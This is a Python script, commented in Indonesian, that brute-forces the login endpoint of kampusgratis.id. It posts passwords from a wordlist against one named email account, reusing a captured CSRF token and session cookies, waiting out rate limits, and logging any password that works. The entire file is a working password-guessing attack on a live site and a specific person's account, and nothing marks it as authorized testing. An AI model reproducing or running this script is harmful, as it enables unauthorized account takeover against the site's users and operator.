import requests
import urllib.parse
from colorama import init, Fore, Style
import datetime
import time

# Inisialisasi Colorama
init(autoreset=True)

# Konfigurasi endpoint dan header
url = "https://kampusgratis.id/api/auth/callback/login"
headers = {
    "Host": "kampusgratis.id",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://kampusgratis.id/auth/login?callbackUrl=https%3A%2F%2Fkampusgratis.id%2Fadministrasi",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://kampusgratis.id",
    "Cookie": "_ga_YWYY60L1FX=GS1.1.1735109684.43.1.1735109755.60.0.0; _ga=GA1.1.1889359778.1731805687; _tt_enable_cookie=1; _ttp=dgmVZqr9G7Dh5iAnfGk5nckQQHb.tt.1; _gcl_au=1.1.765410170.1731889479.941020187.1735109695.1735109757; __Host-next-auth.csrf-token=41a761bb149a74cfde589fa9d8cc178987d7b60ee00e5eebb796209182d3f309%7C2f1a5bdcafc2c018b8facfd10f2687b7cf048d375c0be7e44c8b90cdecedaa9d; __Secure-next-auth.callback-url=https%3A%2F%2Fkampusgratis.id%2Fadministrasi",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=4",
    "TE": "trailers"
}

# File wordlist password
password_file = "D:/XAMMP/htdocs/tools/password-brute-force/password_wordlist.txt"  # Ganti dengan path wordlist Anda
log_file = "bruteforce_results.log"  # Log file untuk menyimpan hasil yang berhasil

def brute_force_single_request():
    # Baca semua password dari wordlist
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    # Iterasi melalui setiap password
    for password in passwords:
        # Encode password menggunakan URL encoding
        encoded_password = urllib.parse.quote_plus(password)

        # Data yang akan dikirim
        data = f"email=bigesly%40gmail.com&password={encoded_password}&redirect=false&csrfToken=41a761bb149a74cfde589fa9d8cc178987d7b60ee00e5eebb796209182d3f309&callbackUrl=https%3A%2F%2Fkampusgratis.id%2Fauth%2Flogin%3FcallbackUrl%3Dhttps%253A%252F%252Fkampusgratis.id%252Fadministrasi&json=true"

        try:
            # Kirim satu permintaan POST
            response = requests.post(url, headers=headers, data=data)

            # Debugging: Cetak respons server
            print(Fore.BLUE + f"Password: {password}")
            print(Fore.YELLOW + f"Status Code: {response.status_code}")
            print(Fore.WHITE + f"Response Text: {response.text}\n")

            # Penanganan respons server
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if response.status_code == 200 and "error" not in response.text.lower():
                success_message = f"[SUCCESS] Password ditemukan: {password}"
                print(Fore.GREEN + success_message)

                # Simpan ke log file
                with open(log_file, "a", encoding="utf-8") as log:
                    log.write(f"[{timestamp}] {success_message}\n")
                break  # Berhenti jika password ditemukan
            elif response.status_code == 401:
                print(Fore.RED + f"[FAILED] Password salah: {password}")
            elif response.status_code == 429 or "Too many requests from this IP" in response.text:
                print(Fore.YELLOW + "[RATE-LIMIT] Terlalu banyak permintaan. Menunggu 3 menit...\n")
                time.sleep(3 * 60)  # Tunggu 3 menit sebelum mencoba lagi
            elif response.status_code == 500:
                print(Fore.MAGENTA + "[SERVER ERROR] Ada masalah di server. Mencoba kembali...\n")
                time.sleep(5)  # Tunggu beberapa saat sebelum mencoba lagi
            else:
                print(Fore.CYAN + f"[INFO] Status code tidak dikenali: {response.status_code}. Memeriksa respons...\n")

        except Exception as e:
            print(Fore.RED + f"[ERROR] Terjadi kesalahan: {e}")

        # Tunggu 3 menit sebelum mencoba password berikutnya
        print(Fore.CYAN + "Menunggu 3 menit sebelum mencoba password berikutnya...\n")
        time.sleep(3 * 60)

if __name__ == "__main__":
    print(Fore.CYAN + Style.BRIGHT + "Memulai proses brute force...\n")
    brute_force_single_request()
    print(Fore.CYAN + Style.BRIGHT + "Proses selesai. Lihat log file untuk hasil yang berhasil.")
